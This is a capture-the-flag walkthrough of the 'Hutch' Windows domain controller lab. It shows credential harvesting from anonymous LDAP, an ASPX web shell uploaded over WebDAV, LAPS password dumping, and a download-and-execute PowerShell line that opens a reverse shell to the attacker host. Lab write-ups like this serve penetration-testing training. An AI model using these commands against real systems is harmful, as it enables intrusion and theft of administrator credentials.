## Walkthrough

Running `ldapsearch -H ldap://192.168.135.122:389 -x -b DC=hutch,DC=offsec` we see these creds

```text
# Freddy McSorley, Users, hutch.offsec
dn: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Freddy McSorley
description: Password set to CrabSharkJellyfish192 at user's request. Please c
 hange on next login.
distinguishedName: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
```

Testing on SMB we see they work

```text
root@kali:~/CTF/PGPractice/Hutch# crackmapexec smb 192.168.135.122 -u fmcsorley -p CrabSharkJellyfish192
SMB         192.168.135.122 445    HUTCHDC          [*] Windows 10.0 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.135.122 445    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192

root@kali:~/CTF/PGPractice/Hutch# smbmap -u fmcsorley -p CrabSharkJellyfish192 -H 192.168.135.122
[+] Finding open SMB ports....
[+] User SMB session established on 192.168.135.122...
[+] IP: 192.168.135.122:445     Name: 192.168.135.122
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        .
        fr--r--r--                3 Mon Jan  1 06:55:25 1601    InitShutdown
        fr--r--r--                4 Mon Jan  1 06:55:25 1601    lsass
        fr--r--r--                3 Mon Jan  1 06:55:25 1601    ntsvcs
        fr--r--r--                3 Mon Jan  1 06:55:25 1601    scerpc
        fr--r--r--                1 Mon Jan  1 06:55:25 1601    Winsock2\CatalogChangeListener-320-0
        fr--r--r--                3 Mon Jan  1 06:55:25 1601    epmapper
        fr--r--r--                1 Mon Jan  1 06:55:25 1601    Winsock2\CatalogChangeListener-1f0-0
        fr--r--r--                3 Mon Jan  1 06:55:25 1601    LSM_API_service
        fr--r--r--                3 Mon Jan  1 06:55:25 1601    eventlog
        fr--r--r--                1 Mon Jan  1 06:55:25 1601    Winsock2\CatalogChangeListener-3a4-0
        fr--r--r--                4 Mon Jan  1 06:55:25 1601    wkssvc
        fr--r--r--                1 Mon Jan  1 06:55:25 1601    Winsock2\CatalogChangeListener-248-0
        fr--r--r--                1 Mon Jan  1 06:55:25 1601    Winsock2\CatalogChangeListener-248-1
        fr--r--r--                3 Mon Jan  1 06:55:25 1601    atsvc
        fr--r--r--                1 Mon Jan  1 06:55:25 1601    Winsock2\CatalogChangeListener-440-0
        fr--r--r--                3 Mon Jan  1 06:55:25 1601    RpcProxy\49669
        fr--r--r--                3 Mon Jan  1 06:55:25 1601    99803e1e87f195c1
        fr--r--r--                3 Mon Jan  1 06:55:25 1601    RpcProxy\593
        fr--r--r--                4 Mon Jan  1 06:55:25 1601    srvsvc
        fr--r--r--                3 Mon Jan  1 06:55:25 1601    spoolss
        fr--r--r--                1 Mon Jan  1 06:55:25 1601    Winsock2\CatalogChangeListener-490-0
        fr--r--r--                3 Mon Jan  1 06:55:25 1601    netdfs
        fr--r--r--                1 Mon Jan  1 06:55:25 1601    Winsock2\CatalogChangeListener-23c-0
        fr--r--r--                1 Mon Jan  1 06:55:25 1601    vgauth-service
        fr--r--r--                3 Mon Jan  1 06:55:25 1601    ROUTER
        fr--r--r--                3 Mon Jan  1 06:55:25 1601    W32TIME_ALT
        fr--r--r--                1 Mon Jan  1 06:55:25 1601    Winsock2\CatalogChangeListener-798-0
        fr--r--r--                1 Mon Jan  1 06:55:25 1601    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
        fr--r--r--                1 Mon Jan  1 06:55:25 1601    Winsock2\CatalogChangeListener-3e0-0
        fr--r--r--                1 Mon Jan  1 06:55:25 1601    Winsock2\CatalogChangeListener-428-0
        fr--r--r--                1 Mon Jan  1 06:55:25 1601    ProtectedPrefix\LocalService\FTHPIPE
        fr--r--r--                1 Mon Jan  1 06:55:25 1601    iisipm9e31cb2f-a516-4b37-9e2a-5f9f104d908a
        fr--r--r--                1 Mon Jan  1 06:55:25 1601    iislogpipea21c080f-082f-4310-ad3f-b17dc230d358
        fr--r--r--                1 Mon Jan  1 06:55:25 1601    gOPq8sviJEovMzG17D6MMLo1mqa67nY57uP8xRzgB3u1cGF2is98cr9UDFLpdn0VNambzu3l1rAtvJ71kvyY9mBGoc8lHuJCV0dc4giVY9B8ZlJTzhTHzJ
        IPC$                                                    READ ONLY       Remote IPC
        .
        dr--r--r--                0 Wed Nov  4 13:25:46 2020    .
        dr--r--r--                0 Wed Nov  4 13:25:46 2020    ..
        NETLOGON                                                READ ONLY       Logon server share
        .
        dr--r--r--                0 Wed Nov  4 13:25:46 2020    .
        dr--r--r--                0 Wed Nov  4 13:25:46 2020    ..
        dr--r--r--                0 Wed Nov  4 13:25:46 2020    hutch.offsec
        SYSVOL                                                  READ ONLY       Logon server share

root@kali:~/CTF/PGPractice/Hutch# smbclient -U fmcsorley%CrabSharkJellyfish192 -L //192.168.135.122

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.135.122 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

From our nmap webdav scan we see that its enabled on port 80

```text
80/tcp    open     http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-webdav-scan:
|   Server Type: Microsoft-IIS/10.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Date: Sat, 19 Jun 2021 05:46:49 GMT
```

However without authentication it doesn't work

```text
root@kali:~/CTF/PGPractice/Hutch# davtest -url http://192.168.135.122
********************************************************
 Testing DAV connection
OPEN            FAIL:   http://192.168.135.122  Unauthorized. Basic realm="192.168.135.122"
```

We have fmcsorley's creds, so let's try it

## Upload webshell

```text
root@kali:~/CTF/PGPractice/Hutch# davtest -url http://192.168.135.122 -auth fmcsorley:CrabSharkJellyfish192
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://192.168.135.122
********************************************************
NOTE    Random string for this session: ARlQFV
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://192.168.135.122/DavTestDir_ARlQFV
********************************************************
 Sending test files
PUT     jhtml   SUCCEED:        http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.jhtml
PUT     jsp     SUCCEED:        http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.jsp
PUT     cgi     SUCCEED:        http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.cgi
PUT     pl      SUCCEED:        http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.pl
PUT     asp     SUCCEED:        http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.asp
PUT     shtml   SUCCEED:        http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.shtml
PUT     html    SUCCEED:        http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.html
PUT     php     SUCCEED:        http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.php
PUT     aspx    SUCCEED:        http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.aspx
PUT     txt     SUCCEED:        http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.txt
PUT     cfm     SUCCEED:        http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.cfm
********************************************************
 Checking for test file execution
EXEC    jhtml   FAIL
EXEC    jsp     FAIL
EXEC    cgi     FAIL
EXEC    pl      FAIL
EXEC    asp     SUCCEED:        http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.asp
EXEC    shtml   FAIL
EXEC    html    SUCCEED:        http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.html
EXEC    php     FAIL
EXEC    aspx    SUCCEED:        http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.aspx
EXEC    txt     SUCCEED:        http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.txt
EXEC    cfm     FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://192.168.135.122/DavTestDir_ARlQFV
PUT File: http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.jhtml
PUT File: http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.jsp
PUT File: http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.cgi
PUT File: http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.pl
PUT File: http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.asp
PUT File: http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.shtml
PUT File: http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.html
PUT File: http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.php
PUT File: http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.aspx
PUT File: http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.txt
PUT File: http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.cfm
Executes: http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.asp
Executes: http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.html
Executes: http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.aspx
Executes: http://192.168.135.122/DavTestDir_ARlQFV/davtest_ARlQFV.txt
```

We can upload aspx code and get Web code exec. We can upload an aspx shell either with `curl`

```text
root@kali:~/CTF/PGPractice/Hutch# curl http://192.168.135.122 --upload-file cmdasp.aspx --user 'fmcsorley:CrabSharkJellyfish192'
```

or `cadaver`

```text
root@kali:~/CTF/PGPractice/Hutch# cadaver http://192.168.135.122
Authentication required for 192.168.135.122 on server `192.168.135.122':
Username: fmcsorley
Password:
dav:/> help
Available commands:
 ls         cd         pwd        put        get        mget       mput
 edit       less       mkcol      cat        delete     rmcol      copy
 move       lock       unlock     discover   steal      showlocks  version
 checkin    checkout   uncheckout history    label      propnames  chexec
 propget    propdel    propset    search     set        open       close
 echo       quit       unset      lcd        lls        lpwd       logout
 help       describe   about
Aliases: rm=delete, mkdir=mkcol, mv=move, cp=copy, more=less, quit=exit=bye
dav:/> ls
Listing collection `/': succeeded.
Coll:   DavTestDir_ARlQFV                      0  Jun 19 15:28
Coll:   aspnet_client                          0  Nov  4  2020
        cmdasp.aspx                         1400  Jun 19 15:34
        iisstart.htm                         703  Nov  4  2020
        iisstart.png                       99710  Nov  4  2020
        index.aspx                          1241  Nov  5  2020
dav:/> put cmdasp.aspx
Uploading cmdasp.aspx to `/cmdasp.aspx':
Progress: [=============================>] 100.0% of 1400 bytes succeeded.
```

## Exploitation

After uploading, we can trigger it by visiting the page and getting it to download and execute rshell.ps1

```text
root@kali:~/CTF/PGPractice/Hutch# rlwrap nc -nlvp 88
listening on [any] 88 ...
connect to [192.168.49.135] from (UNKNOWN) [192.168.135.122] 50623
Windows PowerShell running as user HUTCHDC$ on HUTCHDC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
iis apppool\defaultapppool
```

## Privilege Escalation

There are two similar paths here. Off Sec's solution runs through ldapsearch again, but this time with fmcsorley's creds to get a password

```text
kali@kali:~$ ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -h 192.168.120.108 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
ldap_initialize( ldap://192.168.120.108 )
filter: (ms-MCS-AdmPwd=*)
requesting: ms-MCS-AdmPwd 
# extended LDIF
#
# LDAPv3
# base <DC=hutch,DC=offsec> with scope subtree
# filter: (ms-MCS-AdmPwd=*)
# requesting: ms-MCS-AdmPwd 
#

# HUTCHDC, Domain Controllers, hutch.offsec
dn: CN=HUTCHDC,OU=Domain Controllers,DC=hutch,DC=offsec
ms-Mcs-AdmPwd: P1kk3ln;!u3568

# search reference
ref: ldap://ForestDnsZones.hutch.offsec/DC=ForestDnsZones,DC=hutch,DC=offsec

# search reference
ref: ldap://DomainDnsZones.hutch.offsec/DC=DomainDnsZones,DC=hutch,DC=offsec

# search reference
ref: ldap://hutch.offsec/CN=Configuration,DC=hutch,DC=offsec

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

With these we can RunAs Administrator

```text
PS C:\Users\fmcsorley> $username = 'hutch.offsec\Administrator'
PS C:\Users\fmcsorley> $password = 'P1kk3ln;!u3568'
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
PS C:\Users\fmcsorley> PS C:\Users\fmcsorley> $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username,$secstr
PS C:\Users\fmcsorley> Invoke-Command -ScriptBlock {IEX(IWR http://192.168.49.135/rshell.ps1 -UseBasicParsing)} -Credential $cred -Computer localhost

root@kali:~/CTF/PGPractice/Hutch# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.135.122 - - [19/Jun/2021 16:09:50] "GET /rshell.ps1 HTTP/1.1" 200 -

root@kali:~/CTF/PGPractice/Hutch/PE# rlwrap nc -nlvp 88
listening on [any] 88 ...
connect to [192.168.49.135] from (UNKNOWN) [192.168.135.122] 50803
Windows PowerShell running as user Administrator on HUTCHDC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\Documents>whoami
hutch\administrator
```

The other way is to run Bloodhound and notice that fmcsorley has **ReadLAPSPassword** privs, which allow you to use [this script](https://github.com/n00py/LAPSDumper) to dump admin creds, after adding hutch.offsec to /etc/hosts.

```text
root@kali:~/CTF/PGPractice/Hutch# ./laps.py -u fmcsorley -p CrabSharkJellyfish192 -d hutch.offsec
HUTCHDC$:P1kk3ln;!u3568
```

Then do a RunAs or evil-winrm login as Administrator.